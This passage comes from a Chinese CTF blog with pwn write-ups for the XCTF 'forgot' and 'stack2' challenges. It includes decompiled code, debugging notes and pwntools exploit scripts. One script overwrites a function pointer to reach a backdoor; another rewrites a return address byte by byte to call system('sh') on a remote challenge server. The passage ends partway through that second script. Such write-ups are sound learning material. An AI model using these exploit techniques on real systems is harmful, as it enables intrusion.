punctuation">}</span></code></pre><p>snprintf函数收录</p><h2 id="3：分析"><a href="#3：分析" class="headerlink" title="3：分析"></a>3：分析</h2><p>首先由于存在栈溢出，且数组v2下面的都是函数指针那我们就可以控制fun1<del>fun3，以及v6</del>v12的函数指针，还有v14。<br>有后门，那么我们只要想到如何控制程序流程跳转到后门即可。<br>在for循环语句中，会根据数组v2中的字符来改变v14的大小，跳出循环后到这个语句：(*(&amp;fun1 + –v14))() 显然是执行指针所指向的函数。整个过程&amp;fun1不变，变的只有v14那么我们可以设计payload使得v14的变化在我们可以预测。那么就要好好分析switch case中的语句。<br>我们进入第一个判断函数sub_8048702：</p><pre><code>_BOOL4 __cdecl sub_8048702(char a1){  return a1 &gt; &#39;`&#39; &amp;&amp; a1 &lt;= &#39;z&#39; || a1 &gt; &#39;/&#39; &amp;&amp; a1 &lt;= &#39;9&#39; || a1 == &#39;_&#39; || a1 == &#39;-&#39; || a1 == &#39;+&#39; || a1 == &#39;.&#39;;// A~Z ：65~90   \xcc\x86\x04\x08}</code></pre><p>说实话第一眼看到这个鬼东西我是真的不想去分析它的逻辑，但是没办法，做生意又不会做。<br>&amp;&amp;  的优先级比 ||高  俩个都是从左到右。第一个&amp;&amp;最先计算，第一个||是最后运算，第二个&amp;&amp;第二运算  其他|| 从左到右。<br>因为第二个||是最后运算的，所以第一个&amp;&amp;运算结果是1那整体就是1. 为了不使v14有过多改变我们想办法构造的输入使这个整体为0.<br>发现没有对大写字母的判断所以padding可以用A。<br>仔细观察下面的判断，结合第一个判断我们知道只要payload里面没有@，v14就不可能大于3.<strong>所以程序流程只能最后执行&amp;fun1上面的函数，或是&amp;fun1+1上面的函数，这里需要对&amp;fun1+1和fun+1说明一下</strong></p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">;</span>    fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结果</p><pre class=" language-bash"><code class="language-bash">000000000040153000000000004015318000000000062FDD0000000000062FDD8000000000062FDD8</code></pre><p>fp是一个指针放入了main函数的地址。我们直接输出fp时输出了它的值，也就是main函数地址，对其+1再输出可以看到其输出也仅仅是+1（数值+1）<br>不过我输出fp的地址&amp;fp，再输出其地址+1的结果，可以看到变动了0x8，也恰好等于下一个指针的地址。并不是简单+1。<strong>所以对于地址（&amp;取地址，操作目标是地址）那就是正真的地址+1到下一个地址。</strong><br><strong>回到&amp;fun+1 那么这将指向下一个函数，即fun2 = sub_8048618。</strong></p><p>所以我们要么覆盖fun1，要么覆盖fun2.用后门地址<br>payload = ‘A’*0x24 + p32(0x080486CC)<br>这里我打算覆盖到fun2，因为p32(0x080486CC)（这个东西经过判断函数后是会让v14变成2的,反正我当时是这么想的)</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> p32<span class="token punctuation">(</span>0x080486CC<span class="token punctuation">)</span> <span class="token string">'\xcc\x86\x04\x08'</span><span class="token operator">>></span><span class="token operator">></span></code></pre><p>自己写一个一模一样的判断函数然后输入这一串字符你就会发现会使if成立。然后v14==2 并且一直等于2 </p><p>那么(*(&amp;fun1 + –v14))() 就会指向fun2.</p><h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40479)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./forgot'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x080486cc door</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486cc</span><span class="token punctuation">)</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong><em>但是很可惜，我的分析又是错的（日了狗了，很操蛋）</em></strong></p><h2 id="5：探究"><a href="#5：探究" class="headerlink" title="5：探究"></a>5：探究</h2><p>我觉的思路绝对没问题，折腾了好久发现问题出在pwntools上。<br>看看我的一个程序：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'\x00'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a1<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'/'</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'9'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'_'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"work!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>没错我会输入<span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x080486CC</span><span class="token punctuation">)</span>具体内容，然后看看到底会判断结果是什么</code></pre><pre class=" language-bash"><code class="language-bash">In <span class="token punctuation">[</span>4<span class="token punctuation">]</span>: payloadOut<span class="token punctuation">[</span>4<span class="token punctuation">]</span>: <span class="token string">'\xcc\x86\x04\x08'</span></code></pre><p>首先我直接输入\xcc\x86\x04\x08：<br><img src="https://s1.ax1x.com/2020/07/16/UrhfSI.png" alt=""><br>发现确实如我上面所说，会判断为正确（work）</p><p>但是我用脚本执行并输入：<br><img src="https://s1.ax1x.com/2020/07/16/Urh46P.png" alt=""><br>并没有通过判断！！！！<br><strong>看来 用pyhton-pwntools 输入与人工输入是有区别的</strong>。再来看一个：<br><img src="https://s1.ax1x.com/2020/07/16/Urhhlt.png" alt=""><br>这是我第一次想到的脚本，你会发现36个A后面的东西很奇怪，尤其是第一个\还带~的，这些问题有待考究。</p><p>因为p32(0x080486cc)用pwntools输入并不会通过判断所以最终的EXP是：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40479)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./forgot'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x080486cc door</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486cc</span><span class="token punctuation">)</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x29 bytes:    00000000  63 61 74 3a  20 2e 2f 66  6c 61 67 3a  20 e6 b2 a1  │cat:│ ./f│lag:│ ···│    00000010  e6 9c 89 e9  82 a3 e4 b8  aa e6 96 87  e4 bb b6 e6  │····│····│····│····│    00000020  88 96 e7 9b  ae e5 bd 95  0a                        │····│····│·│    00000029cat: ./flag: 没有那个文件或目录<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./forgot'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 47704<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  一句话：虽然很操蛋，但是通过自己死磕搞懂了还是挺爽的。</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-challege </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challenge-stack2</title>
      <link href="/2020/07/15/xctf-challenge-stack2/"/>
      <url>/2020/07/15/xctf-challenge-stack2/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/stack2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>开启NX与Canary</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-90h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-8Ch]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-88h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-84h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-80h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-7Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-78h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-74h]</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-70h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-Ch]</span>  v14 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*                      An easy calc                       *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*Give me your numbers and I will return to you an average *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*(0 &lt;= x &lt; 256)                                           *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v13<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v5<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"average is %.2lf\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">)</span>v9 <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">0x63</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>            v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>      v9 <span class="token operator">+</span><span class="token operator">=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>关键段：</strong></p><pre class=" language-c"><code class="language-c">      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span></code></pre><h2 id="3：漏洞"><a href="#3：漏洞" class="headerlink" title="3：漏洞"></a>3：漏洞</h2><p><strong>整个代码比较长，但有用的就那么一两个。</strong>关键段代码实现更改数字的功能，v13数组大小是100，<strong>但在这里并没有看到限制了目标位置的输入大小，即：which number to change: 。</strong>而通过伪代码发现v13位于[ebp-70h]所以如果我第一次输入的数字比较大，就可以通过第二次输入来更改高地址栈空间。<br>那么接下来主要就是计算v13到返回地址的长度。</p><p>一开始我认为是这样的：<br><img src="https://s1.ax1x.com/2020/07/15/U0ZMKP.png" alt=""><br>那么只要0x70+4 =116个padding就可以了但是怎么都没有成功跳转，我调试发现原来，这个程序的栈没有这么理想：<br><img src="https://s1.ax1x.com/2020/07/15/U0Zlb8.png" alt=""><br>刚开始是这个样子，返回地址__libc_start_main+241已经在栈中了，可以理解为main函数也是被调用的（call）先压入返回地址再跳转执行函数</p><p>执行完main+7：<br><img src="https://s1.ax1x.com/2020/07/15/U0ZQDf.png" alt=""><br>发现上面那个push指令又将这个返回地址压入栈中，那么哪一个才是真的返回地址？那肯定遵循调用函数（call）的说法：<strong>先将返回地址压入栈中，再跳转执行函数，所以一开始压入的才是函数真正的返回地址。</strong><br>我们可以看到马上要执行push  ebp，所以返回地址离ebp有16个字节的距离。这个从栈中可以看出，也可以从一个作恶多端的汇编指令中得出：发现了<strong>0x80485d4 &lt;main+4&gt;:    and    esp,0xfffffff0</strong>  这句话吗？<br>没错是用来平衡堆栈的，与运算。将esp最后一个16进制数归零。我们去看一下当时esp是多少：<br><img src="https://s1.ax1x.com/2020/07/15/U0Z3VS.png" alt=""><br>可以看到是0xffffd02c  那么执行后就是0xffffd0c0 少了12个字节，所以栈中正确的样子是：<br><img src="https://s1.ax1x.com/2020/07/15/U0Zuvt.png" alt=""><br>所以需要的padding是：0x70+8+16 = 132.（可以自己随便输入某个数字来验证是否改变了返回地址）</p><h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><p><strong>在v13[v5] = v7;这条指令中 v7是int型v13是char型只占用一个字节（在赋值过程会转型），很适合payload来以字节大小填充。也就是说我们执行这条指令是以一个字节一个字节形式进行数据覆盖（16进制的两个数字）。</strong><br>通过IDA看到后门地址0x804859b 可以执行system(“/bin/bash”).因为每利用一次漏洞只能覆盖两个16进制数，所以要多次运行change numbers 选项。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh =process('./stack2')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">32607</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0804859B 后门</span><span class="token comment" spellcheck="true">#0x8048450 system</span><span class="token comment" spellcheck="true">#0x08048987 : sh</span><span class="token comment" spellcheck="true">#addr = [0x9b,0x85,0x04,0x08]               #原本我可以直接用后门地址，填充四次就可以了.这个本地没问题，但在打开端口后因为环境中只有sh这个指令所以会失败</span>addr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#这个是来应对环境中只有sh命令，用gdb找到system函数地址，ROPgadgate找到sh字符串地址</span>                                                                        <span class="token comment" spellcheck="true">#在栈上构造了一个system("/sh")</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token 